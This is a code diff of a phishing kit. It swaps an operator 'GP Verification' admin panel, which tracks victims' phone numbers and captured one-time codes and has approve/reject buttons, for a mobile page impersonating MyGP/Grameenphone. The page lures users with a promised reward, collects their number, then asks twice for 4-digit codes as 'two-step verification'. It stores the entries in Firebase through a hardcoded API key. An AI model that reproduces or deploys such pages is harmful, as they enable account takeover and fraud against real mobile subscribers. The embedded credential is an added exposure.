@@ -2,336 +2,962 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - GP Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Phone Number Input with Toggle Prefix</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            background-color: #f0f2f5;
-            padding: 20px;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            position: fixed;
         }
 
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-        }
-
-        header {
-            background: linear-gradient(135deg, #3498db, #2980b9);
-            color: white;
-            padding: 25px;
-            border-radius: 15px;
-            margin-bottom: 30px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+        .top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            background-color: #FFFFFF;
             display: flex;
             justify-content: space-between;
             align-items: center;
+            padding: 0 15px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+            z-index: 2000;
+            border-bottom: 1px solid #eaeaea;
         }
 
-        header h1 {
-            font-size: 28px;
-            font-weight: 600;
-            letter-spacing: 0.5px;
+        .top-bar img {
+            height: 40px;
+            width: auto;
+            object-fit: contain;
+            cursor: pointer;
         }
 
-        header h1 span {
-            font-size: 16px;
-            background: rgba(255,255,255,0.2);
-            padding: 5px 12px;
-            border-radius: 20px;
-            margin-left: 15px;
+        .container {
+            text-align: center;
+            width: 100%;
+            padding: 20px;
+            transition: transform 0.2s ease;
+            padding-top: 80px;
+            max-width: 400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .title-container {
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto 25px;
+            text-align: left;
+        }
+
+        .title-text {
+            font-size: 18px;
+            font-weight: bold;
+            color: #333;
+            display: inline-block;
+            margin-right: 5px;
+        }
+
+        .subtitle-text {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.4;
+            display: inline;
+        }
+
+        .input-container {
+            position: relative;
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto 15px;
+            display: block;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 40px 12px 65px;
+            font-size: 18px;
+            border: 2px solid #3498db;
+            border-radius: 10px;
+            outline: none;
+            background: #E9E9E9;
+            color: #333;
+            box-sizing: border-box;
+            letter-spacing: 2px;
+            font-weight: bold;
+        }
+
+        .input-field::-webkit-outer-spin-button,
+        .input-field::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .input-field[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        .prefix-text {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            font-size: 18px;
+            color: #333;
+            font-weight: bold;
+            letter-spacing: 2px;
+            pointer-events: auto;
+            cursor: pointer;
+            z-index: 2;
+            background-color: #E9E9E9;
+            padding-right: 5px;
+            transition: color 0.2s ease;
+        }
+
+        .prefix-text:hover {
+            color: #3498db;
+        }
+
+        .vertical-line {
+            position: absolute;
+            top: 50%;
+            left: 60px;
+            transform: translateY(-50%);
+            width: 2px;
+            height: 50%;
+            background-color: #3498db;
+            border-radius: 2px;
+            pointer-events: none;
+        }
+
+        .input-icon {
+            position: absolute;
+            top: 50%;
+            right: 12px;
+            transform: translateY(-50%);
+            width: 24px;
+            height: 24px;
+            pointer-events: none;
+            z-index: 1;
+            object-fit: cover;
+        }
+
+        .shake-container {
+            animation: containerShake 0.4s ease-in-out;
+        }
+
+        @keyframes containerShake {
+            0% { transform: translateX(0); }
+            10% { transform: translateX(-8px); }
+            20% { transform: translateX(8px); }
+            30% { transform: translateX(-6px); }
+            40% { transform: translateX(6px); }
+            50% { transform: translateX(-4px); }
+            60% { transform: translateX(4px); }
+            70% { transform: translateX(-2px); }
+            80% { transform: translateX(2px); }
+            90% { transform: translateX(-1px); }
+            100% { transform: translateX(0); }
+        }
+
+        .input-field::placeholder {
             font-weight: normal;
+            color: #999;
+            letter-spacing: 2px;
         }
 
-        .refresh-btn {
-            background: rgba(255,255,255,0.2);
-            border: 1px solid rgba(255,255,255,0.3);
+        .verify-btn {
+            width: 100%;
+            max-width: 300px;
+            padding: 14px 20px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            cursor: not-allowed;
+            background-color: #b0c4de;
             color: white;
-            padding: 10px 20px;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            margin: 0 auto;
+            display: block;
+            position: relative;
+            min-height: 52px;
+        }
+
+        .verify-btn.active {
+            background-color: #3498db;
+            cursor: pointer;
+        }
+
+        .verify-btn .btn-text {
+            display: inline-block;
+        }
+
+        .verify-btn .spinner-container {
+            display: none;
+        }
+
+        .verify-btn.loading .btn-text {
+            display: none;
+        }
+
+        .verify-btn.loading .spinner-container {
+            display: flex;
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .modal-overlay.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: white;
+            border-radius: 15px;
+            padding: 25px;
+            width: 90%;
+            max-width: 350px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            animation: slideUp 0.3s ease;
+            position: relative;
+            z-index: 10001;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .modal-header h3 {
+            color: #333;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        .modal-number {
+            background-color: #f0f8ff;
+            border: 2px solid #3498db;
+            border-radius: 10px;
+            padding: 5px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .modal-number .label {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .modal-number .number {
+            color: #333;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 3px;
+            word-break: break-all;
+        }
+
+        .modal-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            flex: 1;
+            padding: 14px 0;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
             border-radius: 10px;
             cursor: pointer;
-            font-size: 15px;
-            font-weight: 500;
             transition: all 0.3s ease;
+            letter-spacing: 1px;
+        }
+
+        .modal-btn.edit {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+
+        .modal-btn.edit:hover {
+            background-color: #d0d0d0;
+        }
+
+        .modal-btn.close {
+            background-color: #3498db;
+            color: white;
+        }
+
+        .modal-btn.close:hover {
+            background-color: #2980b9;
+        }
+
+        .spinner-container {
             display: flex;
+            justify-content: center;
             align-items: center;
             gap: 8px;
         }
 
-        .refresh-btn:hover {
-            background: rgba(255,255,255,0.3);
-            transform: translateY(-2px);
+        .spinner-dot {
+            width: 12px;
+            height: 12px;
+            background-color: white;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out both;
         }
 
-        .stats-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-            gap: 20px;
+        .spinner-dot.small {
+            width: 10px;
+            height: 10px;
+            animation-delay: -0.32s;
+        }
+
+        .spinner-dot.medium {
+            width: 14px;
+            height: 14px;
+            animation-delay: -0.16s;
+        }
+
+        .spinner-dot.large {
+            width: 18px;
+            height: 18px;
+            animation-delay: 0s;
+        }
+
+        .spinner-container.green-spinner .spinner-dot {
+            background-color: #4CAF50;
+        }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); } 
+            40% { transform: scale(1.0); }
+        }
+
+        .second-page {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            z-index: 20000;
+            transition: right 0.4s ease-in-out;
+            box-shadow: -2px 0 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .second-page.open {
+            right: 0;
+        }
+
+        .second-page-content {
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        .brand-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .brand-header img {
+            width: 30px;
+            height: 30px;
+            object-fit: contain;
+        }
+
+        .brand-header span {
+            font-size: 24px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .second-page h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 30px;
+            font-weight: bold;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
             margin-bottom: 30px;
         }
 
-        .stat-card {
-            background: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
-            border-left: 4px solid #3498db;
+        .otp-box {
+            width: 55px;
+            height: 65px;
+            border: 2px solid #3498db;
+            border-radius: 10px;
+            font-size: 32px;
+            font-weight: bold;
+            text-align: center;
+            background-color: #E9E9E9;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s ease, background-color 0.3s ease;
         }
 
-        .stat-card h3 {
+        .otp-box.error {
+            border-color: #ff4444;
+            background-color: #ffe6e6;
+            animation: errorShake 0.4s ease-in-out;
+        }
+
+        @keyframes errorShake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .otp-box:focus {
+            border-color: #2980b9;
+            box-shadow: 0 0 5px rgba(52, 152, 219, 0.5);
+        }
+
+        .otp-box::-webkit-outer-spin-button,
+        .otp-box::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .otp-box[type="number"] {
+            -moz-appearance: textfield;
+        }
+
+        .verify-otp-btn {
+            padding: 14px 20px;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            cursor: not-allowed;
+            background-color: #b0c4de;
+            color: white;
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+            width: 100%;
+            max-width: 300px;
+            margin: 0 auto;
+            display: block;
+            position: relative;
+            min-height: 52px;
+        }
+
+        .verify-otp-btn.active {
+            background-color: #3498db;
+            cursor: pointer;
+        }
+
+        .verify-otp-btn .btn-text {
+            display: inline-block;
+        }
+
+        .verify-otp-btn .spinner-container {
+            display: none;
+        }
+
+        .verify-otp-btn.loading .btn-text {
+            display: none;
+        }
+
+        .verify-otp-btn.loading .spinner-container {
+            display: flex;
+        }
+
+        .third-page {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 100%;
+            height: 100%;
+            background-color: #4CAF50;
+            z-index: 21000;
+            transition: right 0.4s ease-in-out;
+            box-shadow: -2px 0 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .third-page.open {
+            right: 0;
+        }
+
+        .third-page-content {
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .third-page-spinner {
+            margin-bottom: 40px;
+        }
+
+        .third-page-spinner .spinner-dot {
+            background-color: white;
+            width: 16px;
+            height: 16px;
+        }
+
+        .third-page-spinner .spinner-dot.small {
+            width: 12px;
+            height: 12px;
+        }
+
+        .third-page-spinner .spinner-dot.medium {
+            width: 20px;
+            height: 20px;
+        }
+
+        .third-page-spinner .spinner-dot.large {
+            width: 24px;
+            height: 24px;
+        }
+
+        .moments-text {
+            font-size: 28px;
+            color: white;
+            letter-spacing: 2px;
+            font-weight: 500;
+            text-align: center;
+            line-height: 1.4;
+            margin-top: 20px;
+        }
+
+        .fourth-page {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 100%;
+            height: 100%;
+            background-color: #FFFFFF;
+            z-index: 22000;
+            transition: right 0.4s ease-in-out;
+            box-shadow: -2px 0 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .fourth-page-inner {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            margin-top: -30px; 
+        }
+
+        .fourth-page-inner .brand-header {
+            margin-bottom: 20px;
+        }
+
+        .fourth-page-inner h2 {
+            margin-bottom: 25px;
+            font-size: 22px;
+            color: #333;
+        }
+
+        .fourth-page.open {
+            right: 0;
+        }
+
+        .fifth-page {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 100%;
+            height: 100%;
+            background-color: #4CAF50;
+            z-index: 23000;
+            transition: right 0.4s ease-in-out;
+            box-shadow: -2px 0 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .fifth-page.open {
+            right: 0;
+        }
+
+        .fifth-page-content {
+            text-align: center;
+            width: 100%;
+            max-width: 350px;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .slider-container {
+            width: 100%;
+            max-width: 300px;
+            margin: 30px auto 15px;
+            position: relative;
+            overflow: hidden;
+            border-radius: 15px;
+        }
+
+        .slider-wrapper {
+            display: flex;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .slider-item {
+            flex: 0 0 100%;
+            width: 100%;
+            padding: 0 5px;
+        }
+
+        .slider-item img {
+            width: 100%;
+            height: auto;
+            border-radius: 15px;
+            display: block;
+            pointer-events: none;
+            border: 1px solid #ddd;
+        }
+
+        .slider-indicators {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #ccc;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .indicator.active {
+            background-color: #3498db;
+            transform: scale(1.1);
+        }
+
+        .bottom-line {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 3px;
+            background-color: #BABABA;
+            border-radius: 3px;
+            z-index: 1000;
+        }
+
+        .brand-text {
+            position: fixed;
+            bottom: 8px;
+            left: 50%;
+            transform: translateX(-50%);
             color: #666;
             font-size: 14px;
             font-weight: 500;
-            margin-bottom: 8px;
-            text-transform: uppercase;
             letter-spacing: 0.5px;
+            text-align: center;
+            width: 100%;
+            z-index: 1000;
+            font-family: Arial, sans-serif;
         }
 
-        .stat-card .number {
-            font-size: 32px;
-            font-weight: 700;
-            color: #2c3e50;
+        .success-text {
+            font-size: 30px;
+            font-weight: bold;
+            color: white;
+            text-align: center;
+            letter-spacing: 1px;
         }
 
-        .stat-card .number span {
-            font-size: 16px;
-            color: #7f8c8d;
-            font-weight: 400;
-            margin-left: 8px;
+        .success-image {
+            width: 140px;
+            height: auto;
+            margin-bottom: 25px;
+            animation: float 3s ease-in-out infinite; 
         }
 
-        .requests-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(15px); }
+            100% { transform: translateY(0px); }
+        }
+
+        .failed-page {
+            position: fixed;
+            top: 0;
+            right: -100%;
+            width: 100%;
+            height: 100%;
+            background-color: #ff4444;
+            z-index: 21500;
+            transition: right 0.4s ease-in-out;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: white;
+            text-align: center;
+        }
+
+        .failed-page.open {
+            right: 0;
+        }
+
+        .failed-page {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             gap: 20px;
         }
 
-        .request-card {
-            background: white;
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid #eef2f6;
+        .failed-icon {
+            width: 120px;
+            height: auto;
+            margin-bottom: 10px;
         }
 
-        .request-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+        .failed-text {
+            font-size: 29px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-top: 10px;
         }
 
-        .card-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 2px solid #f0f2f5;
-        }
-
-        .phone-number {
-            font-size: 22px;
-            font-weight: 700;
-            color: #2c3e50;
-            letter-spacing: 0.5px;
-        }
-
-        .status-badge {
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 12px;
-            font-weight: 600;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .status-pending_number { background: #fff3cd; color: #856404; }
-        .status-pending_otp1 { background: #cce5ff; color: #004085; }
-        .status-in_moments { background: #d4edda; color: #155724; }
-        .status-pending_otp2 { background: #d1ecf1; color: #0c5460; }
-
-        .otp-display {
-            background: #f8f9fa;
-            border-radius: 10px;
-            padding: 12px;
-            margin-bottom: 15px;
-        }
-
-        .otp-row {
-            display: flex;
-            align-items: center;
-            margin-bottom: 8px;
-        }
-
-        .otp-row:last-child {
-            margin-bottom: 0;
-        }
-
-        .otp-label {
-            width: 60px;
-            font-size: 14px;
-            color: #7f8c8d;
-            font-weight: 500;
-        }
-
-        .otp-value {
-            font-size: 24px;
-            font-weight: 700;
-            color: #2c3e50;
-            letter-spacing: 4px;
-            background: white;
-            padding: 5px 15px;
-            border-radius: 8px;
-            border: 1px solid #e0e0e0;
-            font-family: monospace;
-        }
-
-        .otp-value.empty {
-            color: #aaa;
+        .try-again-text {
             font-size: 18px;
-            letter-spacing: 2px;
-        }
-
-        .action-buttons {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-top: 15px;
-        }
-
-        .action-btn {
-            flex: 1;
-            min-width: 80px;
-            padding: 12px 8px;
-            border: none;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .action-btn.approve { background: #4CAF50; color: white; }
-        .action-btn.approve:hover { background: #45a049; transform: scale(1.02); }
-
-        .action-btn.correct { background: #4CAF50; color: white; }
-        .action-btn.correct:hover { background: #45a049; transform: scale(1.02); }
-
-        .action-btn.wrong { background: #ff4444; color: white; }
-        .action-btn.wrong:hover { background: #ff3333; transform: scale(1.02); }
-
-        .action-btn.complete { background: #4CAF50; color: white; }
-        .action-btn.complete:hover { background: #45a049; transform: scale(1.02); }
-
-        .action-btn.fail { background: #ff4444; color: white; }
-        .action-btn.fail:hover { background: #ff3333; transform: scale(1.02); }
-
-        .action-btn.next { background: #3498db; color: white; }
-        .action-btn.next:hover { background: #2980b9; transform: scale(1.02); }
-
-        .action-btn.yes { background: #4CAF50; color: white; }
-        .action-btn.yes:hover { background: #45a049; transform: scale(1.02); }
-
-        .action-btn.no { background: #ff4444; color: white; }
-        .action-btn.no:hover { background: #ff3333; transform: scale(1.02); }
-
-        .timestamp {
-            margin-top: 15px;
-            font-size: 11px;
-            color: #95a5a6;
-            text-align: right;
-            border-top: 1px solid #ecf0f1;
-            padding-top: 10px;
-        }
-
-        .no-requests {
-            grid-column: 1 / -1;
-            text-align: center;
-            padding: 60px;
-            background: white;
-            border-radius: 15px;
-            color: #7f8c8d;
-            font-size: 16px;
-        }
-
-        .loading {
-            text-align: center;
-            padding: 50px;
-            font-size: 18px;
-            color: #666;
-        }
-
-        .loading-spinner {
-            display: inline-block;
-            width: 40px;
-            height: 40px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 15px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+            color: #ffffff;
+            opacity: 0.9;
+            margin-top: 5px;
+            font-weight: normal;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>
-                Admin Control Panel 
-                <span>GP Verification</span>
-            </h1>
-            <button class="refresh-btn" onclick="loadRequests()">
-                <span>🔄</span> Refresh Data
-            </button>
-        </header>
+    <div class="top-bar">
+        <img src="https://i.postimg.cc/zfQrzh2b/20260306-105606.png" alt="Brand Icon">
+        <img src="https://i.postimg.cc/q7dx1Gc7/20260305-054458.png" alt="New Icon">
+        <img src="https://i.postimg.cc/fT8gQNrx/20260306-110046.png" alt="Right Icon" onclick="window.location.href='https://www.grameenphone.com'">
+    </div>
 
-        <div class="stats-container" id="statsContainer">
-            <div class="stat-card">
-                <h3>Total Requests</h3>
-                <div class="number" id="totalRequests">0</div>
-            </div>
-            <div class="stat-card">
-                <h3>Pending Number</h3>
-                <div class="number" id="pendingNumberCount">0</div>
-            </div>
-            <div class="stat-card">
-                <h3>Pending OTP 1</h3>
-                <div class="number" id="pendingOtp1Count">0</div>
-            </div>
-            <div class="stat-card">
-                <h3>In Moments</h3>
-                <div class="number" id="inMomentsCount">0</div>
-            </div>
-            <div class="stat-card">
-                <h3>Pending OTP 2</h3>
-                <div class="number" id="pendingOtp2Count">0</div>
-            </div>
+    <div class="container" id="container">
+        <div class="title-container">
+            <span class="title-text">Your phone number</span>
+            <span class="subtitle-text">Please enter the correct number. Otherwise, verification may fail or you may not receive the reward.</span>
         </div>
 
-        <div class="requests-grid" id="requestsGrid">
-            <div class="loading">
-                <div class="loading-spinner"></div>
-                <div>Loading requests...</div>
+        <div class="input-container" id="inputContainer">
+            <span class="prefix-text" id="prefixText">017</span>
+            <input type="text" class="input-field" id="phoneInput" value="" maxlength="8" placeholder="XXXXXXXX" inputmode="numeric" pattern="\d*">
+            <div class="vertical-line" id="verticalLine"></div>
+            <img src="https://i.postimg.cc/q7dx1Gc7/20260305-054458.png" alt="icon" class="input-icon">
+        </div>
+
+        <button class="verify-btn" id="verifyBtn" disabled>
+            <span class="btn-text">Verify</span>
+            <div class="spinner-container">
+                <div class="spinner-dot small"></div>
+                <div class="spinner-dot medium"></div>
+                <div class="spinner-dot large"></div>
+            </div>
+        </button>
+
+        <div class="slider-container" id="sliderContainer">
+    <div class="slider-wrapper" id="sliderWrapper">
+        <div class="slider-item">
+            <img src="https://i.postimg.cc/FFnPvG1d/image-01.jpg" alt="Offer 1">
+        </div>
+        <div class="slider-item">
+            <img src="https://i.postimg.cc/50z2352K/20260306_184416.jpg" alt="Offer 2">
+        </div>
+        <!-- নতুন ছবি যোগ করুন এইখানে -->
+        <div class="slider-item">
+            <img src="https://i.postimg.cc/Fs7jQ814/20260306_182650.jpg" alt="Offer 3">
+        </div>
+    </div>
+</div>
+        <div class="slider-indicators" id="sliderIndicators">
+    <button class="indicator active" data-index="0"></button>
+    <button class="indicator" data-index="1"></button>
+    <button class="indicator" data-index="2"></button>
+</div>
+    </div>
+    <div class="bottom-line"></div>
+    <div class="brand-text">MyGP - Grameenphone</div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Confirm your number</h3>
+            </div>
+            <div class="modal-number">
+                <div class="label">Is this the correct number?</div>
+                <div class="number" id="modalNumber"></div>
+            </div>
+            <div class="modal-buttons">
+                <button class="modal-btn edit" id="modalEditBtn">Edit</button>
+                <button class="modal-btn close" id="modalCloseBtn">Verify</button>
             </div>
         </div>
     </div>
 
+    <div class="second-page" id="secondPage">
+        <div class="second-page-content">
+            <div class="brand-header">
+                <img src="https://i.postimg.cc/q7dx1Gc7/20260305-054458.png" alt="Grameenphone Icon">
+                <span>Grameenphone</span>
+            </div>
+            <h2>Enter 4-digit code</h2>
+            <div class="otp-container">
+                <input type="text" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-box" id="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-box" id="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            <button class="verify-otp-btn" id="verifyOtpBtn" disabled>
+                <span class="btn-text">Verify</span>
+                <div class="spinner-container">
+                    <div class="spinner-dot small"></div>
+                    <div class="spinner-dot medium"></div>
+                    <div class="spinner-dot large"></div>
+                </div>
+            </button>
+        </div>
+    </div>
+
+    <div class="third-page" id="thirdPage">
+        <div class="third-page-content">
+            <div class="third-page-spinner spinner-container">
+                <div class="spinner-dot small"></div>
+                <div class="spinner-dot medium"></div>
+                <div class="spinner-dot large"></div>
+            </div>
+            <div class="moments-text">A few moments</div>
+        </div>
+    </div>
+
+    <div class="fourth-page" id="fourthPage">
+        <div class="fourth-page-inner">
+            <div class="brand-header">
+                <img src="https://i.postimg.cc/q7dx1Gc7/20260305-054458.png" alt="Grameenphone Icon">
+                <span>Grameenphone</span>
+            </div>
+            <h2>Enter 4-digit code</h2>
+            <div class="otp-container">
+                <input type="text" class="otp-box" id="otp_p4_1" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-box" id="otp_p4_2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-box" id="otp_p4_3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+                <input type="text" class="otp-box" id="otp_p4_4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
+            </div>
+            <button class="verify-otp-btn" id="verifyOtpBtnPage4" disabled>
+                <span class="btn-text">Verify</span>
+                <div class="spinner-container">
+                    <div class="spinner-dot small"></div>
+                    <div class="spinner-dot medium"></div>
+                    <div class="spinner-dot large"></div>
+                </div>
+            </button>
+            <div style="margin-top: 25px; color: #666; font-size: 16px; font-weight: 500; letter-spacing: 0.5px;">
+                Two-step verification
+            </div>
+        </div>
+    </div>
+
+    <div class="fifth-page" id="fifthPage">
+        <div class="fifth-page-content">
+            <img src="https://i.postimg.cc/DwmnZxP6/20260309-153740.png" alt="Success Icon" class="success-image">
+            <h2 class="success-text">Successfully verified</h2>
+        </div>
+    </div>
+
+    <div class="failed-page" id="failedPage">
+        <img src="https://i.postimg.cc/sg0wzMb8/20260308-191205.png" alt="Failed Icon" class="failed-icon">
+        <div class="failed-text">VERIFICATION FAILED!</div>
+        <div class="try-again-text">Try again later.</div>
+    </div>
+
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-app.js";
-        import { getDatabase, ref, onValue, set, get } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-database.js";
+        import { getDatabase, ref, set, get, child, onValue, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.10.0/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyBuPWP1rrQvvJI4kETUjXjlbT3-tkjOlT8",
@@ -346,198 +972,890 @@
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // Load all requests
-        window.loadRequests = function() {
-            const requestsRef = ref(database, 'requests');
-            
-            onValue(requestsRef, (snapshot) => {
-                const data = snapshot.val();
-                displayRequests(data);
-                updateStats(data);
-            }, (error) => {
-                console.error("Error loading requests:", error);
-                document.getElementById('requestsGrid').innerHTML = `
-                    <div class="no-requests" style="color: #ff4444;">
-                        Error loading requests. Please refresh.
-                    </div>
-                `;
-            });
-        };
+        window.firebaseDatabase = database;
+        window.firebaseRef = ref;
+        window.firebaseSet = set;
+        window.firebaseGet = get;
+        window.firebaseChild = child;
+        window.firebaseOnValue = onValue;
+        window.firebaseServerTimestamp = serverTimestamp;
+    </script>
 
-        // Update status for a user
-        window.updateUserStatus = async function(phoneNumber, newStatus, additionalData = {}) {
-            const userRef = ref(database, `requests/${phoneNumber}`);
-            
-            try {
-                // Get current data first
-                const snapshot = await get(userRef);
-                const currentData = snapshot.val() || {};
-                
-                // Update with new status
-                await set(userRef, {
-                    ...currentData,
-                    ...additionalData,
-                    status: newStatus,
-                    lastUpdated: new Date().toISOString()
-                });
-                
-                console.log(`Updated ${phoneNumber} to status: ${newStatus}`);
-            } catch (error) {
-                console.error("Error updating status:", error);
-                alert("Failed to update status. Check console for details.");
-            }
-        };
+    <script>
+        (function() {
+            const phoneInput = document.getElementById('phoneInput');
+            const inputContainer = document.getElementById('inputContainer');
+            const prefixText = document.getElementById('prefixText');
+            const verticalLine = document.getElementById('verticalLine');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const container = document.getElementById('container');
+            let currentPrefix = '017'; // ডিফল্ট প্রিফিক্স
 
-        function displayRequests(data) {
-            const grid = document.getElementById('requestsGrid');
-            
-            if (!data) {
-                grid.innerHTML = '<div class="no-requests">No active requests found.</div>';
-                return;
-            }
+            const modalOverlay = document.getElementById('modalOverlay');
+            const modalNumber = document.getElementById('modalNumber');
+            const modalEditBtn = document.getElementById('modalEditBtn');
+            const modalCloseBtn = document.getElementById('modalCloseBtn');
 
-            const requests = Object.entries(data)
-                .filter(([_, request]) => request && request.status)
